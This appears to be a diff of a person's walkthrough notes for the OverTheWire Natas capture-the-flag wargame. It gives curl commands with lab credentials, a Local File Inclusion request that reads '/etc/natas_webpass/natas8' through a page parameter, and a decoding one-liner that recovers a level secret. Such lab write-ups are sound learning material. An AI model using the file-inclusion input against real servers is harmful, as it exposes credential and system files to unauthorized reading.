@@ -45,3 +45,14 @@ note: This level is a classic example of a Local File Inclusion (LFI) vulnerabil
 command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/
 command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
+level 9 	natas9			ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+note: 	The PHP code tells you exactly what it's doing: it's taking your input, running it through a series of encoding functions, and checking if the result matches a predefined encoded string.
+	you need to reverse the process that the encodeSecret function performs.
+	The Breakdown
+	The encodeSecret function performs three operations, from inside out:
+	1) base64_encode($secret): It first Base64-encodes the secret you provide.
+	2) strrev(...): It then reverses the order of the characters in the Base64-encoded string.
+	3) bin2hex(...): Finally, it converts the reversed string from its binary representation to a hexadecimal string.
+command ==> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
+		output: oubWYf2kBq
+command ==> curl -u "natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q" -X POST -d "secret=oubWYf2kBq&submit=1" http://natas8.natas.labs.overthewire.org/
